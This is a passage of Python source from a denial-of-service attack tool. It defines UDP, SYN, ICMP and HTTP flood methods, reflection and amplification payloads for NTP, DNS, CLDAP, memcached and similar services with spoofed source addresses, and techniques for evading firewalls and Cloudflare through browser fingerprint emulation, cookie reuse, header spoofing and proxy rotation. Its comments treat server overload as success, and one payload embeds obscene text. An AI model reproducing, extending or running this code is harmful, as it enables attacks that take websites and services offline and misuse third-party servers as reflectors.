        payload = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
                   b'\x20\x51\x75\x65\x72\x79\x00')
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def FIVEMTOKEN(self) -> None:
        global BYTES_SEND, REQUESTS_SENT

        # Generete token and guid
        token = str(uuid4())
        steamid_min = 76561197960265728
        steamid_max = 76561199999999999
        guid = str(randint(steamid_min, steamid_max))

        # Build Payload
        payload_str = f"token={token}&guid={guid}"
        payload = payload_str.encode('utf-8')

        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def FIVEM(self) -> None:
        global BYTES_SEND, REQUESTS_SENT
        payload = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def TS3(self) -> None:
        global BYTES_SEND, REQUESTS_SENT
        payload = b'\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02'
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def MCPE(self) -> None:
        global BYTES_SEND, REQUESTS_SENT
        payload = (b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f'
                   b'\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20'
                   b'\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c'
                   b'\x73')
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def _generate_ovhudp(self) -> List[bytes]:
        packets = []

        methods = ["PGET", "POST", "HEAD", "OPTIONS", "PURGE"]
        paths = ['/0/0/0/0/0/0', '/0/0/0/0/0/0/', '\\0\\0\\0\\0\\0\\0', '\\0\\0\\0\\0\\0\\0\\', '/', '/null', '/%00%00%00%00']

        for _ in range(randint(2, 4)):
            ip = IP()
            ip.set_ip_src(__ip__)
            ip.set_ip_dst(self._target[0])

            udp = UDP()
            udp.set_uh_sport(randint(1024, 65535))
            udp.set_uh_dport(self._target[1])

            payload_size = randint(1024, 2048)
            random_part = randbytes(payload_size).decode("latin1", "ignore")

            method = randchoice(methods)
            path = randchoice(paths)

            payload_str = (
                f"{method} {path}{random_part} HTTP/1.1\n"
                f"Host: {self._target[0]}:{self._target[1]}\r\n\r\n"
            )

            payload = payload_str.encode("latin1", "ignore")

            udp.contains(Data(payload))
            ip.contains(udp)

            packets.append(ip.get_packet())

        return packets

    def _genrate_syn(self) -> bytes:
        ip: IP = IP()
        ip.set_ip_src(__ip__)
        ip.set_ip_dst(self._target[0])
        tcp: TCP = TCP()
        tcp.set_SYN()
        tcp.set_th_flags(0x02)
        tcp.set_th_dport(self._target[1])
        tcp.set_th_sport(ProxyTools.Random.rand_int(32768, 65535))
        ip.contains(tcp)
        return ip.get_packet()

    def _genrate_icmp(self) -> bytes:
        ip: IP = IP()
        ip.set_ip_src(__ip__)
        ip.set_ip_dst(self._target[0])
        icmp: ICMP = ICMP()
        icmp.set_icmp_type(icmp.ICMP_ECHO)
        icmp.contains(Data(b"A" * ProxyTools.Random.rand_int(16, 1024)))
        ip.contains(icmp)
        return ip.get_packet()

    def _generate_amp(self):
        payloads = []
        for ref in self._ref:
            ip: IP = IP()
            ip.set_ip_src(self._target[0])
            ip.set_ip_dst(ref)

            ud: UDP = UDP()
            ud.set_uh_dport(self._amp_payload[1])
            ud.set_uh_sport(self._target[1])

            ud.contains(Data(self._amp_payload[0]))
            ip.contains(ud)

            payloads.append((ip.get_packet(), (ref, self._amp_payload[1])))
        return payloads

    def select(self, name):
        self.SENT_FLOOD = self.TCP
        for key, value in self.methods.items():
            if name == key:
                self.SENT_FLOOD = value
            elif name == "ICMP":
                self.SENT_FLOOD = self.ICMP
                self._target = (self._target[0], 0)
            elif name == "RDP":
                self._amp_payload = (
                    b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00',
                    3389)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "CLDAP":
                self._amp_payload = (
                    b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00'
                    b'\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00',
                    389)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "MEM":
                self._amp_payload = (
                    b'\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n', 11211)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "CHAR":
                self._amp_payload = (b'\x01', 19)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "ARD":
                self._amp_payload = (b'\x00\x14\x00\x00', 3283)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "NTP":
                self._amp_payload = (b'\x17\x00\x03\x2a\x00\x00\x00\x00', 123)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "DNS":
                self._amp_payload = (
                    b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00'
                    b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00',
                    53)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())


# [V6] Async HTTP/2 Flood Engine — Bypasses GIL with true async I/O
class AsyncHttpFlood(Thread):
    """Each thread runs its own asyncio event loop with httpx.AsyncClient
    for genuine HTTP/2 multiplexing (hundreds of concurrent streams per connection)"""
    
    def __init__(self, thread_id: int, target: URL, host: str, 
                 rpc: int = 50, synevent: Event = None,
                 useragents: list = None, referers: list = None,
                 proxies: list = None, crawled_paths: list = None, method: str = "GET"):
        Thread.__init__(self, daemon=True)
        self._thread_id = thread_id
        self._target = target
        self._host = host
        self._rpc = rpc
        self._synevent = synevent
        self._proxies = proxies
        self.crawled_paths = crawled_paths or []
        self._method = method if method in ["GET", "POST"] else "GET"
        self.host_array = []
        
        self._cf_clearance = None
        cf_path = Path(__dir__ / "files/cf_clearance.txt")
        if cf_path.exists():
            self._cf_clearance = cf_path.read_text().strip()
            

        self._useragents = list(useragents) if useragents else [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0',
        ]
        self._referers = list(referers) if referers else [
            'https://www.google.com/', 'https://www.bing.com/', 
            'https://www.facebook.com/', 'https://duckduckgo.com/'
        ]
    
    def _get_random_path(self) -> str:
        if self.crawled_paths and randint(0, 100) < 60:
            return randchoice(self.crawled_paths)
        heavy = ["/", "/?s=" + ProxyTools.Random.rand_str(5),
                 "/search/" + ProxyTools.Random.rand_str(8)]
        return randchoice(heavy)
    
    def _get_proxy_url(self) -> str:
        if not self._proxies:
            return None
        for _ in range(20):
            p = randchoice(self._proxies)
            p_str = str(p)
            burn_time = BURNED_PROXIES.get(p_str)
            if not burn_time or (time() - burn_time >= COOLING_PERIOD):
                if "://" in p_str:
                    return p_str
                return f"http://{p_str}"
        return None
    
    def _generate_post_payload(self) -> str:
        # [WAF BYPASS] Intelligent payload generator to evade WAF static analysis
        # Many WAFs block static {"data": "xxxxx"} patterns
        # Uses smart content-type-aware payloads for deeper evasion
        r_type = randint(1, 6)
        if r_type == 1:
            return '{"search": "%s", "limit": %d}' % (ProxyTools.Random.rand_str(16), randint(10, 100))
        elif r_type == 2:
            return '{"user_id": "%s", "action": "ping"}' % uuid4()
        elif r_type == 3:
            return '{"payload": "%s", "timestamp": %d}' % (ProxyTools.Random.rand_str(32), int(time()))
        elif r_type == 5:
            # GraphQL-style query (common in modern apps)
            return '{"query":"query{__typename}","variables":{"id":"%s"}}' % ProxyTools.Random.rand_str(12)
        else:
            return '{"data": "%s"}' % ProxyTools.Random.rand_str(32)

    async def _flood_batch(self, client: httpx.AsyncClient, batch_size: int = 50):
        """Fire batch_size requests concurrently via HTTP/2 multiplexing"""
        global REQUESTS_SENT, BYTES_SEND, CONNECTIONS_SENT, ERROR_COUNT
        
        target_domain = self._target.user or self._target.host
        
        async def single_request():
            global REQUESTS_SENT, BYTES_SEND, CONNECTIONS_SENT
            path = self._get_random_path()
            safe_path = path if path.startswith("/") else f"/{path}"
            url = f"{self._target.scheme}://{self._target.host}{safe_path}"
            ua = randchoice(self._useragents)
            
            headers = {
                "User-Agent": ua,
                "Accept-Encoding": "gzip, deflate, br",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "X-Forwarded-For": Tools.get_random_indo_ip(),
                "Referer": randchoice(self._referers),
                "Host": target_domain,
                "Sec-Ch-Ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Priority": "u=0, i",
            }
            # Inject all harvested cookies + cf_clearance for maximum trust
            if hasattr(self, '_chaos_get_cookie_header'):
                cookie_str = self._chaos_get_cookie_header()
                if cookie_str:
                    headers["Cookie"] = cookie_str
            elif hasattr(self, '_cf_clearance') and self._cf_clearance:
                headers["Cookie"] = f"cf_clearance={self._cf_clearance}"
            
            try:
                target_ip = randchoice(self.host_array) if hasattr(self, 'host_array') and self.host_array else self._target.host
                url = f"{self._target.scheme}://{target_ip}{safe_path}"
                
                if self._method == "POST":
                    headers["Content-Type"] = "application/json"
                    headers["X-Requested-With"] = "XMLHttpRequest"
                    resp = await client.post(url, headers=headers, content=self._generate_post_payload())
                else:
                    resp = await client.get(url, headers=headers)
                    
                REQUESTS_SENT += 1
                CONNECTIONS_SENT += 1
                BYTES_SEND += 1000
                
                if resp.status_code in {403, 429}:
                    BURNED_PROXIES[str(self._proxies)] = time() if self._proxies else None
                elif resp.status_code >= 500:
                    pass  # Target overloaded — good
            except Exception as e:
                Tools.track_error(e)
        
        tasks = [single_request() for _ in range(batch_size)]
        await asyncio.gather(*tasks, return_exceptions=True)
    
    async def _run_async(self):
        """Main async loop: create client, fire batches until event clears"""
        global REQUESTS_SENT, ERROR_COUNT
        
        while self._synevent.is_set():
            proxy_url = self._get_proxy_url()
            try:
                async with httpx.AsyncClient(
                    http2=True,
                    verify=False,
                    proxy=proxy_url,
                    timeout=httpx.Timeout(5.0, connect=3.0),
                    limits=httpx.Limits(max_connections=100, max_keepalive_connections=50)
                ) as client:
                    # Fire multiple batches per client connection
                    # [FIX] Pipeline: fire multiple batches concurrently for max throughput
                    while self._synevent.is_set():
                        batch_tasks = [self._flood_batch(client, batch_size=50) for _ in range(min(self._rpc, 10))]
                        await asyncio.gather(*batch_tasks, return_exceptions=True)
            except Exception as e:
                Tools.track_error(e)
                await asyncio.sleep(0.5)
    
    def run(self):
        if self._synevent:
            self._synevent.wait()
        
        # Each thread gets its own event loop for true async I/O
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(self._run_async())
        except Exception as e:
            Tools.track_error(e)
        finally:
            loop.close()


# noinspection PyBroadException,PyUnusedLocal
class HttpFlood(Thread):
    _proxies: List[Proxy] = None
    _payload: str
    _defaultpayload: Any
    _req_type: str
    _useragents: List[str]
    _referers: List[str]
    _target: URL
    _method: str
    _rpc: int
    _synevent: Any
    SENT_FLOOD: Any

    def __init__(self,
                 thread_id: int,
                 target: URL,
                 host: str,
                 method: str = "GET",
                 rpc: int = 1,
                 synevent: Event = None,
                 useragents: Set[str] = None,
                 referers: Set[str] = None,
                 proxies: Set[Proxy] = None) -> None:
        Thread.__init__(self, daemon=True)
        self.SENT_FLOOD = None
        self._thread_id = thread_id
        self._synevent = synevent
        self._rpc = rpc
        self._method = method
        self._target = target
        self._host = host
        self._raw_target = (self._host, (self._target.port or 80))
        
        # [NEW] Crawler Integration placeholder
        # The main loop will inject crawled_paths into the class instance if found
        self.crawled_paths = []

        if not self._target.host[len(self._target.host) - 1].isdigit():
            self._raw_target = (self._host, (self._target.port or 80))

        self.methods = {
            "POST": self.POST,
            "CFB": self.CFB,
            "CFBUAM": self.CFBUAM,
            "XMLRPC": self.XMLRPC_AMP,
            "BOT": self.BOT,
            "APACHE": self.APACHE,
            "BYPASS": self.BYPASS,
            "DGB": self.DGB,
            "OVH": self.OVH,
            "AVB": self.AVB,
            "STRESS": self.STRESS,
            "DYN": self.DYN,
            "SLOW": self.SLOW,
            "GSB": self.GSB,
            "RHEX": self.RHEX,
            "STOMP": self.STOMP,
            "NULL": self.NULL,
            "COOKIE": self.COOKIES,
            "TOR": self.TOR,
            "EVEN": self.EVEN,
            "DOWNLOADER": self.DOWNLOADER,
            "BOMB": self.BOMB,
            "PPS": self.PPS,
            "KILLER": self.KILLER,
            "WP_SEARCH": self.WP_SEARCH,
            "SLOW_V2": self.SLOW_V2,
            "XMLRPC_AMP": self.XMLRPC_AMP,
            "POST_DYN": self.POST_DYN,
            "H2_FLOOD": self.H2_FLOOD,
            "CHAOS": self.CHAOS,
        }

        if not referers:
            referers: List[str] = [
                "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
                ",https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer"
                "/sharer.php?u=",
                ",https://drive.google.com/viewerng/viewer?url=",
                ",https://www.google.com/translate?u="
            ]
        self._referers = list(referers)
        if proxies is not None:
            self._proxies = proxies # [PHASE 13] Use shared reference, don't copy!

        if not useragents:
            # [V6] Modern User-Agents (Chrome 130+ Era)
            useragents: List[str] = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.1; rv:130.0) Gecko/20100101 Firefox/130.0',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (iPad; CPU OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
                'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15'
            ]
        
        self._useragents = list(useragents)
        
        # [OPTIMIZED] Referer Spoofing List
        referers = [
            'https://www.google.com/',
            'https://www.bing.com/',
            'https://www.facebook.com/',
            'https://twitter.com/',
            'https://www.instagram.com/',
            'https://www.youtube.com/',
            'https://duckduckgo.com/'
        ]
        # [OPTIMIZED] Random Languages
        langs = [
            'en-US,en;q=0.9',
            'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
            'en-GB,en;q=0.9',
            'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
            'es-ES,es;q=0.9'
        ]

        self._useragents = list(useragents)
        self._req_type = self.getMethodType(method)
        # [OPTIMIZED] Cache Busting by Antigravity
        sep = "&" if "?" in target.raw_path_qs else "?"
        rnd = str(randchoice(range(1111, 9999)))
        ver = randchoice(['1.0', '1.1', '1.2'])
        
        # Select Random UA initially
        self.ua = randchoice(self._useragents)
        
        self._defaultpayload = f"{self._req_type} {target.raw_path_qs}{sep}v={rnd} HTTP/{ver}\r\n"
        self._payload = (self._defaultpayload +
                         'Accept-Encoding: gzip, deflate, br\r\n'
                         'Cache-Control: max-age=0\r\n' +
                         self.build_consistent_headers(self.ua) +
                         'Connection: keep-alive\r\n'
                         'Pragma: no-cache\r\n'
                         'Upgrade-Insecure-Requests: 1\r\n')

    def build_consistent_headers(self, ua: str) -> str:
        # [OPTIMIZED] Dynamic Header Generation based on User-Agent
        # Prevents "Inconsistent Hints" detection by WAFs
        platform = "\"Windows\""
        mobile = "?0"
        
        if "Android" in ua:
            platform = "\"Android\""
            mobile = "?1"
        elif "iPhone" in ua or "iPad" in ua:
            platform = "\"iOS\""
            mobile = "?1"
        elif "Macintosh" in ua or "Mac OS" in ua:
            platform = "\"macOS\""
            mobile = "?0"
        elif "Linux" in ua:
            platform = "\"Linux\""
            mobile = "?0"

        clearance = GLOBAL_CF_CLEARANCE if GLOBAL_CF_CLEARANCE else ProxyTools.Random.rand_str(43)
        cookies = f"Cookie: _ga=GA1.1.{randint(1000000, 9999999)}.{randint(1000000000, 2000000000)}; cf_clearance={clearance}; csrftoken={ProxyTools.Random.rand_str(32)}\r\n"
        
        headers = (
            f"X-Forwarded-For: {Tools.get_random_indo_ip()}\r\n"
            f"X-Real-IP: {Tools.get_random_indo_ip()}\r\n"
            f"Client-IP: {Tools.get_random_indo_ip()}\r\n"
            f"{cookies}"
            f"Sec-Fetch-Dest: document\r\n"
            f"Sec-Fetch-Mode: navigate\r\n"
            f"Sec-Fetch-Site: none\r\n"
            f"Sec-Fetch-User: ?1\r\n"
            # [PHASE 6] Localized ISP Spoofing (Indonesian Residential)
            f"X-ISP: {randchoice(['Telkomsel', 'Indihome', 'XL-Axiata', 'Biznet', 'FirstMedia'])}\r\n"
            f"X-Provider-Route: {ProxyTools.Random.rand_str(8)}\r\n"
            f"X-Real-ISP: {randchoice(['PT Telekomunikasi Indonesia', 'PT XL Axiata', 'PT Link Net'])}\r\n"
            f"Sec-Gpc: 1\r\n"
            f"Sec-Ch-Ua: \"Chromium\";v=\"130\", \"Google Chrome\";v=\"130\", \"Not?A_Brand\";v=\"99\"\r\n"
            f"Sec-Ch-Ua-Mobile: {mobile}\r\n"
            f"Sec-Ch-Ua-Platform: {platform}\r\n"
            f"Priority: u=0, i\r\n"
            f"Referer: {randchoice(self._referers)}\r\n"
            f"Accept-Language: en-US,en;q=0.9\r\n"
        )
        return headers

    def select(self, name: str) -> None:
        self.SENT_FLOOD = self.GET
        for key, value in self.methods.items():
            if name == key:
                self.SENT_FLOOD = value

    def get_random_target_path(self) -> str:
        # [NEW] Dynamic Path Randomizer (Chaos Theory)
        choice_roll = randint(0, 100)
        
        # Option A: Real Crawled Paths (If available)
        if hasattr(self, 'crawled_paths') and self.crawled_paths and choice_roll < 60:
            return randchoice(self.crawled_paths)
            
        # Option B: Heavy Paths (Focus on DB/CPU)
        if choice_roll < 80:
            heavy_paths = [
                "/",
                "/wp-login.php",
                "/wp-admin/admin-ajax.php",
                "/xmlrpc.php",
                "/feed/",
                "/comments/feed/",
                "/?s=" + ProxyTools.Random.rand_str(5),
                "/search/" + ProxyTools.Random.rand_str(8),
                "/shop/?orderby=price-desc" # Heavy sorting
            ]
            return randchoice(heavy_paths)
            
        # Option C: Original Target
        return self._target.raw_path_qs
                
    def run(self) -> None:
        if self._synevent: self._synevent.wait()
        self.select(self._method)
        while self._synevent.is_set():
            self.SENT_FLOOD()

    @property
    def SpoofIP(self) -> str:
        spoof: str = ProxyTools.Random.rand_ipv4()
        return ("X-Forwarded-Proto: Http\r\n"
                f"X-Forwarded-Host: {self._target.raw_host}, 1.1.1.1\r\n"
                f"Via: {spoof}\r\n"
                f"Client-IP: {spoof}\r\n"
                f'X-Forwarded-For: {spoof}\r\n'
                f'Real-IP: {spoof}\r\n')

    def generate_payload(self, other: str = None) -> bytes:
        # [OPTIMIZED] Global Dynamic Path Injection
        # Instead of using static self._payload, we rebuild it.
        path = self.get_random_target_path()
        request_line = f"{self._req_type} {path} HTTP/1.1\r\n"
        
        # We also need dynamic headers (UA, Mobile, Platform)
        # Note: randHeadercontent uses a random UA but doesn't sync Sec-Ch-Ua
        # For maximum quality, we should use build_consistent_headers here too.
        ua = randchoice(self._useragents)
        consistent_headers = self.build_consistent_headers(ua)
        
        return (f"{request_line}"
                f"Host: {self._target.authority}\r\n"
                f"User-Agent: {ua}\r\n"
                f"{consistent_headers}"
                f"Referer: {randchoice(self._referers)}\r\n"
                f"{other if other else ''}"
                "\r\n").encode("utf-8")

    def open_connection(self, host=None) -> socket:
        proxy = None
        if self._proxies:
            # [PHASE 13] Dynamic Random Selection for Live Synchronization
            for _ in range(20): 
                p = randchoice(self._proxies)
                p_str = str(p) # [FIX] Use str(p) instead of p.proxy
                
                # Check if proxy is in Cooling Period
                burn_time = BURNED_PROXIES.get(p_str)
                if burn_time:
                    if time() - burn_time > COOLING_PERIOD:
                        with suppress(KeyError):
                            del BURNED_PROXIES[p_str]
                    else:
                        continue 
                
                self._current_proxy = p_str
                proxy = p
                break
            
            if len(BURNED_PROXIES) > len(self._proxies) * 0.8:
                global RECYCLE_EVENT, IS_RECYCLING
                if not IS_RECYCLING:
                    RECYCLE_EVENT.set()
            
            if not proxy:
                RECYCLE_EVENT.set()
                sleep(2)
                proxy = randchoice(self._proxies)
                self._current_proxy = str(proxy)
        
        sock = None
        
        # [V7] Multi-IP Edge Array Targeting
        target_ip = host
        if hasattr(self, 'host_array') and self.host_array:
            target_ip = randchoice(self.host_array)
            self._raw_target = (target_ip, (self._target.port or 80))
            
        try:
            if proxy:
                sock = proxy.open_socket(AF_INET, SOCK_STREAM)
            else:
                sock = socket(AF_INET, SOCK_STREAM)

            sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
            sock.settimeout(3)  # [V6] Reduced from 5s to avoid idle threads on dead proxies
            
            # [FIX] Always pass tuple (ip, port) to connect()
            connect_target = self._raw_target
            if target_ip:
                connect_target = (target_ip, (self._target.port or 80))
            sock.connect(connect_target)
            
            if self._target.scheme == "https":
                sock = ctx.wrap_socket(sock, server_hostname=self._target.host)
            
            return sock
        except Exception as e:
            # [NEW] Connection Debugging
            # if logger.level <= 10: logger.debug(f"Connection Failed: {e}")
            Tools.safe_close(sock)
            return None

    @property
    def randHeadercontent(self) -> str:
        return (f"User-Agent: {randchoice(self._useragents)}\r\n"
                f"Referrer: {randchoice(self._referers)}{parse.quote(self._target.human_repr())}\r\n" +
                self.SpoofIP)

    @staticmethod
    def getMethodType(method: str) -> str:
        return "GET" if {method.upper()} & {"CFB", "CFBUAM", "GET", "TOR", "COOKIE", "OVH", "EVEN",
                                            "DYN", "SLOW", "PPS", "APACHE",
                                            "BOT", "RHEX", "STOMP"} \
            else "POST" if {method.upper()} & {"POST", "XMLRPC", "STRESS"} \
            else "HEAD" if {method.upper()} & {"GSB", "HEAD"} \
            else "REQUESTS"

    def POST(self) -> None:
        payload: bytes = self.generate_payload(
            ("Content-Length: 44\r\n"
             "X-Requested-With: XMLHttpRequest\r\n"
             "Content-Type: application/json\r\n\r\n"
             '{"data": %s}') % ProxyTools.Random.rand_str(32))[:-2]
        s = None
        with  suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def TOR(self) -> None:
        provider = "." + randchoice(tor2webs)
        target = self._target.authority.replace(".onion", provider)
        payload: Any = str.encode(self._payload +
                                  f"Host: {target}\r\n" +
                                  self.randHeadercontent +
                                  "\r\n")
        s = None
        target = self._target.host.replace(".onion", provider), self._raw_target[1]
        with suppress(Exception), self.open_connection(target) as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def STRESS(self) -> None:
        s = None
        try:
            s = self.open_connection()
            global CONNECTIONS_SENT, REQUESTS_SENT, BYTES_SEND
            CONNECTIONS_SENT += 1

            for _ in range(self._rpc):
                # [OPTIMIZED] Dynamic Path
                path = self.get_random_target_path()
                ua = randchoice(self._useragents)
                headers = self.build_consistent_headers(ua)
                
                # Rebuild payload manually to include dynamic path
                payload = (f"{self._req_type} {path} HTTP/1.1\r\n"
                           f"Host: {self._target.authority}\r\n"
                           f"User-Agent: {ua}\r\n"
                           f"{headers}"
                           f"Content-Length: 524\r\n"
                           f"X-Requested-With: XMLHttpRequest\r\n"
                           f"Content-Type: application/json\r\n\r\n"
                           f"{{\"data\": {ProxyTools.Random.rand_str(512)}}}")
                
                if Tools.send(s, payload.encode("utf-8")):
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(payload)
                    if int(REQUESTS_SENT) < 50:
                         print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] STRESS: Packet Sent to {self._target.authority}")
                    # [FIX] Non-blocking status check AFTER send
                    import select
                    readable, _, _ = select.select([s], [], [], 0.01)
                    if readable:
                        try:
                            response_start = s.recv(64).decode('utf-8', errors='ignore')
                            if response_start and ("HTTP/1.1" in response_start or "HTTP/1.0" in response_start):
                                status_code = response_start.split(" ")[1]
                                if status_code in {"403", "429"}:
                                    if hasattr(self, '_current_proxy'):
                                        BURNED_PROXIES[self._current_proxy] = time()
                                    raise Exception("Proxy Blocked")
                        except Exception as e:
                            if "Blocked" in str(e): raise e
        except Exception as e:
            pass
        Tools.safe_close(s)

    def COOKIES(self) -> None:
        payload: bytes = self.generate_payload(
            "Cookie: _ga=GA%s;"
            " _gat=1;"
            " __cfduid=dc232334gwdsd23434542342342342475611928;"
            " %s=%s\r\n" %
            (ProxyTools.Random.rand_int(1000, 99999), ProxyTools.Random.rand_str(6),
             ProxyTools.Random.rand_str(32)))
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def APACHE(self) -> None:
        payload: bytes = self.generate_payload(
            "Range: bytes=0-,%s" % ",".join("5-%d" % i
                                            for i in range(1, 1024)))
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def STEALTH_JA3(self):
        """[V6] Uses tls_client to emulate exact Chrome JA3 fingerprint
        Perfect for evading Akamai, Cloudflare Bot Fight Mode, and Imperva."""
        target_domain = self._target.user or self._target.host
        # Use cache-busting path if available for maximum origin impact
        if hasattr(self, '_chaos_get_cache_busting_path'):
            path = self._chaos_get_cache_busting_path()
        else:
            path = self.get_random_target_path()
        safe_path = path if path.startswith("/") else f"/{path}"
        url = f"{self._target.scheme}://{target_domain}{safe_path}"

        proxy_url = None
        if self._proxies:
            global BURNED_PROXIES
            for _ in range(5):
                p = randchoice(self._proxies)
                p_str = str(p)
                burn_time = BURNED_PROXIES.get(p_str)
                if not burn_time or (time() - burn_time >= COOLING_PERIOD):
                    proxy_url = p_str if "://" in p_str else f"http://{p_str}"
                    self._current_proxy = p_str
                    break

        global CONNECTIONS_SENT, REQUESTS_SENT, BYTES_SEND
        try:
            # StealthClient will use tls_client internally
            session = StealthClient.create_session(proxy_url)
            
            # Use complete browser profile for maximum authenticity
            if hasattr(self, '_BROWSER_PROFILES') and self._BROWSER_PROFILES:
                headers = self._chaos_get_browser_profile()
            else:
                headers = {
                    "User-Agent": randchoice(self._useragents),
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Encoding": "gzip, deflate, br",
                }
            headers["Connection"] = "keep-alive"
            # Add realistic referer from session journey
            if hasattr(self, '_chaos_get_smart_referer'):
                headers["Referer"] = self._chaos_get_smart_referer()
            # Inject all harvested cookies + cf_clearance for maximum trust
            if hasattr(self, '_chaos_get_cookie_header'):
                cookie_str = self._chaos_get_cookie_header()
                if cookie_str:
                    headers["Cookie"] = cookie_str
            elif hasattr(self, '_cf_clearance') and self._cf_clearance:
                headers["Cookie"] = f"cf_clearance={self._cf_clearance}"
                
            for _ in range(self._rpc):
                resp = session.get(url, headers=headers, timeout=5)
                REQUESTS_SENT += 1
                CONNECTIONS_SENT += 1
                BYTES_SEND += 1000  # Estimate
                
                if resp.status_code in {403, 429}:
                    if self._proxies and hasattr(self, '_current_proxy'):
                        BURNED_PROXIES[self._current_proxy] = time()
                    break
        except Exception:
            pass

    def XMLRPC(self) -> None:
        payload: bytes = self.generate_payload(
            ("Content-Length: 345\r\n"
             "X-Requested-With: XMLHttpRequest\r\n"
             "Content-Type: application/xml\r\n\r\n"
             "<?xml version='1.0' encoding='iso-8859-1'?>"
             "<methodCall><methodName>pingback.ping</methodName>"
